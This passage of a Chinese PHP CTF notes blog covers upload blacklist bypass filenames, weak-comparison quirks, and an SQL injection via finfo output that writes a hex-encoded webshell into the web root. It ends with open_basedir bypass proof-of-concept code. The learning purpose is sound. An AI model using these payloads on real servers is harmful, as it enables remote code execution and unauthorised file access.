<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br></pre></td></tr></table></figure>

<p>根据这个特性，我们就可以在一些题目里进行绕过</p>
<p>如果有一个黑名单后缀验证，很显然要使用特殊的符号和可执行的拓展名拼接，但是这个符号不会影响拼接的拓展名服务器识别是脚本文件。</p>
<p>​    如果使用 <code>1.php. </code>的文件名上传上去，最后一个点后面没有正确的后缀名了，pathinfo函数就会返回一个空字符给变量 $file_ext，再拿这个空字符去匹配黑名单显然这个文件就不会被阻止。</p>
<ul>
<li><p>基于windows特性，同样的使用 1.php. .  1.php空格  1.php.空格    1.php::$DATA等格式都可以，可以绕过黑名单，也能让文件最终保存为 1.php 。这个在之前文件上传的知识点里有介绍过</p>
</li>
<li><p>​    如果是linux部署的话，例如00截断抓包改成 1.php%00.jpg （%00要解码，但是要求PHP版本低于5.3.4）。</p>
</li>
<li><p>​    如果PHP版本过高那<code>%00</code>截断就无效了，只能用一个之前从未使用的方法，在两个系统环境使用有一点点区别。在windows下部署可以抓包保存文件名使用<code>1.php/.</code>    <code>1.php\. </code> <code> 1.php/\.</code>等，在linux下部署就只能用<code>1.php/. </code>这个了。原因很简单，文件命名的时候<code>/ \</code>在windows是禁止的而 <code>/ </code>在linux也是禁止的，所以不会出现在文件名中最终保存还是1.php文件名。但是<code>\</code>在linux是一个转义符号允许出现在文件名中，出现在后缀(1.php.)那就没什么意义了。</p>
</li>
<li><p><strong>关于为什么 &#x2F; 后面要一个点，是因为pathinfo函数返回后缀名（最后一个点号后面的字符串）的时候会去除 &#x2F; 和 \ 。如果使用1.php&#x2F;的话，那么去除 &#x2F; 后返回的真实的php后缀被读取到就会黑名单匹配上。加上一个点pathinfo函数读取的就是最后的点后面的字符串，点后面是空字符串不是有效拓展名它就返回为空，空就不会匹配黑名单以达到绕过黑名单目的。</strong></p>
<p>​    再拓展一下<code> \.</code> 在linux的作用。如果linux下有一个文件<code>1.php\.</code>的文件，使用<code>php  1.php\.</code>命令去执行，那么会认为文件名是 <code>1.php.</code> 就会找不到这个文件。正确做法是<code>php &#39;1.php\.&#39;</code>告诉系统 \ 是文件名一部分而不是转义符号。</p>
</li>
</ul>
<p>所以在Linux下我们就可以利用<code>\.</code>去绕过后缀名的检测，接下来我们再学习一个新的姿势点</p>
<h2 id="move-uploaded-file的一个细节"><a href="#move-uploaded-file的一个细节" class="headerlink" title="move_uploaded_file的一个细节"></a>move_uploaded_file的一个细节</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/103784">从0CTF一道题看move_uploaded_file的一个细节问题</a></p>
<p>这个细节的话也是在做TGCTF的时候碰到的，先是用pathinfo()函数结合黑名单对后缀名进行了过滤，再去进行move_uploaded_file操作，对于这一步的绕过，一开始很多人都构造成了 name&#x3D;index.php&#x2F;. 这种格式，但是会发现，这样虽然绕过了后缀检查，<br>其中，假如我们传入的是 name&#x3D;<code>aaa.php/. </code>，则能够正常生成 aaa.php，而传入<code>ndex.php/.</code>则在覆盖文件这一步失败了</p>
<p>在文章的两个测试中，可以发现name&#x3D;index.php&#x2F;. 的错误信息是No Such file or Directory，而name&#x3D;aaa&#x2F;..&#x2F;index.php&#x2F;. 则没有报错，因此初步猜测是move_uploaded_file对于经过了目录跳转后的文件判断机制发生了变化，这里需要结合函数源码进行分析，详细的在这位师傅的文章中写的很好</p>
<p>结论：<strong>在进行了目录跳转后，move_uploaded_file将文件判断为不存在了，因此能够执行覆盖操作。</strong></p>
<p>题目:TGCTF2025–<strong>(ez)upload</strong>（很经典的题目）</p>
<h2 id="in-array-函数弱比较漏洞"><a href="#in-array-函数弱比较漏洞" class="headerlink" title="in_array() 函数弱比较漏洞"></a>in_array() 函数弱比较漏洞</h2><ul>
<li><p>这是 PHP 的一个内置函数，用于检查指定的值是否存在于数组中。</p>
</li>
<li><p>语法是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>$needle</code></strong>: 要搜索的值（在这个例子中是 <code>$_GET[&#39;n&#39;]</code>）。</li>
<li><strong><code>$haystack</code></strong>: 要搜索的数组（在这个例子中是 <code>$allow</code>）。</li>
<li>**<code>$strict</code>**（可选）：如果为 <code>true</code>，则在比较时会进行强类型检查。</li>
</ul>
</li>
</ul>
<p>注:in_array()函数默认没设置为true采用的是弱比较，在进行检查比较的时候会自动进行类型转换，我们来验证一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">#输出结果是yes，证明1和1.php是相等的，即通过了弱比较  </span></span><br></pre></td></tr></table></figure>

<p><strong>in_array() 函数存在弱比较的漏洞，如果没有设置第三个参数，in_array()  函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP  会尝试将字符串转换为整数来进行比较。比如上面字符串类型的 1.php 就自动转换为了整数 1，也就符合在数组中的条件。</strong></p>
<h2 id="strcmp-函数漏洞"><a href="#strcmp-函数漏洞" class="headerlink" title="strcmp()函数漏洞"></a>strcmp()函数漏洞</h2><p><code>strcmp()</code> 是一个 PHP 函数，用于比较两个字符串。它的用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure>

<ul>
<li>如果 <code>str1</code> 小于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个小于 0 的整数。</li>
<li>如果 <code>str1</code> 大于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个大于 0 的整数。</li>
<li>如果 <code>str1</code> 等于 <code>str2</code>，那么 <code>strcmp()</code> 返回 0。</li>
</ul>
<p>strcmp函数无法比较数组,对象，会返回0</p>
<h2 id="关于PHP优先级的规则"><a href="#关于PHP优先级的规则" class="headerlink" title="关于PHP优先级的规则"></a>关于PHP优先级的规则</h2><p>其实是起源于我做到的一个签到题，题目代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump((Object)<span class="subst">$_POST</span>[1]);&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里的话用强制类型转化对我们的参数进行了转换，但是我在测试的时候传入phpinfo()是可以执行phpinfo的，这是为什么呢？</p>
<p>我们先看看运算符优先级</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250430204203212.png" alt="image-20250430204203212"></p>
<p>但是在函数调用结合运算符的时候也是有优先级的，</p>
<p>函数调用和以下运算符的优先级相同：</p>
<ul>
<li><code>()</code>：用于强制改变优先级或调用函数。</li>
<li><code>[]</code>：数组访问。</li>
<li><code>-&gt;</code>：对象成员访问。</li>
<li><code>::</code>：类静态成员访问。</li>
</ul>
<p>并且这些运算符的优先级大于其他运算符，例如我们举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((Object)<span class="title function_ invoke__">phpinfo</span>());</span><br></pre></td></tr></table></figure>

<p>这里按照我们刚刚的说法，这里会先执行函数调用，再进行类型转化，因为phpinfo()函数的返回值是true，那么此时(Object)只是会对phpinfo()的返回值进行转化而不会影响phpinfo本身的执行，不过这道题最终还是通过闭合括号去进行的RCE</p>
<h2 id="finfo文件注入"><a href="#finfo文件注入" class="headerlink" title="finfo文件注入"></a>finfo文件注入</h2><p>这是我在复盘web224的时候重新认识到的一个知识点，假设源码是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">10</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;文件过大: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>))) . <span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">    <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>, <span class="variable">$filetype</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filetype</span> . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$con</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时这里的$filepath和$filename都是不可控的，我们该如何进行sql注入呢</p>
<p>我们看sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot; . $filename . &quot;&#x27;,&#x27;&quot; . $filepath . &quot;&#x27;,&#x27;&quot; . $filetype . &quot;&#x27;);&quot;;</span><br></pre></td></tr></table></figure>

<p>这里可控的只有$filetype了，关于$filetype</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里实例化了finfo对象并调用了file函数，但是这个file函数会返回文件的一些信息，然后我们的payload是这样的</p>
<p>上传一个txt文件，内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C64File <span class="string">&quot;&#x27;);select 0x3c3f3d60746163202f662a603f3e into outfile &#x27;/var/www/html/2.php&#x27;;--+</span></span><br></pre></td></tr></table></figure>

<p>可以看到后面是有闭合并进行sql注入的sql语句，但是这里能否写入呢？</p>
<p>本地测试一下</p>
<p>假设这里有代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;1.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$filetype</span>);</span><br></pre></td></tr></table></figure>

<p>然后当前目录下创建一个txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C64File &quot;&#x27;);select 0x3c3f3d60746163202f666c2a603f3e into outfile &#x27;/var/www/html/file1.php&#x27;;--+</span><br></pre></td></tr></table></figure>

<p>然后我们输出一下</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250507202521426.png" alt="image-20250507202521426"></p>
<p>可以看到这里的sql语句是插进去的了，证明这里可以通过C64File去插入我们的恶意代码让finfo检测的时候将恶意代码一同赋值给filetype</p>
<h2 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h2><p>open_basedir 是 PHP 的一个安全配置指令，由于 open_basedir 限制 PHP 脚本只能访问特定的目录。当前配置只允许访问 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录及其子目录，但不允许访问其他目录。</p>
<h3 id="命令执行函数bypass"><a href="#命令执行函数bypass" class="headerlink" title="命令执行函数bypass"></a>命令执行函数bypass</h3><p>其实open_basedir对命令执行函数是没有限制的，我们用system函数试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo file_get_contents(&#x27;/home/1.txt&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /home/1.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现是可以成功读取到文件的，但是这个是最简单的情况，一般来说会在disable_function禁用掉命令执行函数</p>
<h3 id="利用glob-伪协议Bypass"><a href="#利用glob-伪协议Bypass" class="headerlink" title="利用glob:&#x2F;&#x2F;伪协议Bypass"></a>利用glob:&#x2F;&#x2F;伪协议Bypass</h3><p>这个的话通常用来读目录而不能读文件</p>
<h4 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob:&#x2F;&#x2F;"></a>DirectoryIterator+glob:&#x2F;&#x2F;</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$A</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$A</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>输入<code>glob:///*</code>即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件</p>
<h4 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob:&#x2F;&#x2F;"></a>opendir()+readdir()+glob:&#x2F;&#x2F;</h4><p>opendir函数打开目录句柄，readdir从目录句柄中读取目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;glob:///*&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果也是和方法一一样的</p>
<h3 id="利用chdir-与ini-set-组合"><a href="#利用chdir-与ini-set-组合" class="headerlink" title="利用chdir()与ini_set()组合"></a>利用chdir()与ini_set()组合</h3><p>我们先来了解一下这两个函数</p>
<ul>
<li>chdir()函数</li>
</ul>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250903170700328.png" alt="image-20250903170700328"></p>
<ul>
<li>ini_set()函数</li>
</ul>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250903170743326.png" alt="image-20250903170743326"></p>
<p>其实就是可以设置ini配置，在这里可以看到有一个附录清单，我们点进去看一下</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250903170844776.png" alt="image-20250903170844776"></p>
<p>发现open_basedir也是可以通过这个函数去修改的，那我们可以写出一个可用的poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这里的话需要多用几个chdir函数，确保能移动到根目录</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#include%E5%92%8Cfile-get-content%E5%A4%84%E7%90%86%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%B8%8D%E5%90%8C"><span class="toc-number">1.</span> <span class="toc-text">include和file_get_content处理伪协议的不同</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-content%E7%9A%84%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">file_get_content的源码实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E7%9A%84%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">include的源码实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Emd5%E5%92%8Csha1%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">关于md5和sha1绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">1.数组绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0e%E7%BB%95%E8%BF%87%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">2.2.</span> <span class="toc-text">2.0e绕过弱比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-string%E8%BD%AC%E6%8D%A2%E5%90%8Emd5%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">3.string转换后md5绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8F%8C%E9%87%8Dmd5%E4%B8%8B%E7%9A%840e%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">4.双重md5下的0e绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-md5%E7%BB%95%E8%BF%87SQL"><span class="toc-number">2.5.</span> <span class="toc-text">5.md5绕过SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-md5-sha1-%E5%8A%A0%E5%AF%86%E5%90%8E%E5%BC%B1%E7%AD%89%E4%BA%8E%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="toc-number">2.6.</span> <span class="toc-text">6.md5(sha1)加密后弱等于初始值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%9B%BE%E7%89%87%E6%96%87%E6%9C%AC%E5%BC%BA%E7%A2%B0%E6%92%9E%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.</span> <span class="toc-text">7.图片文本强碰撞绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">is_numeric()函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">strcmp()函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">intval()函数漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFintval-%EF%BC%9F"><span class="toc-number">5.1.</span> <span class="toc-text">什么是intval()？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">5.2.</span> <span class="toc-text">绕过思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stripos-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">stripos()函数绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Epreg-match-%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">关于preg_match()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpreg-match%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">什么是preg_match？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">7.2.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.</span> <span class="toc-text">PHP利用PCRE回溯次数限制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E5%BC%95%E6%93%8E"><span class="toc-number">7.4.</span> <span class="toc-text">正则引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%BA%AF%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">7.5.</span> <span class="toc-text">回溯的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E7%9A%84pcre-backtrack-limit%E9%99%90%E5%88%B6%E5%88%A9%E7%94%A8"><span class="toc-number">7.6.</span> <span class="toc-text">关于PHP的pcre.backtrack_limit限制利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace-e-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84RCE"><span class="toc-number">8.</span> <span 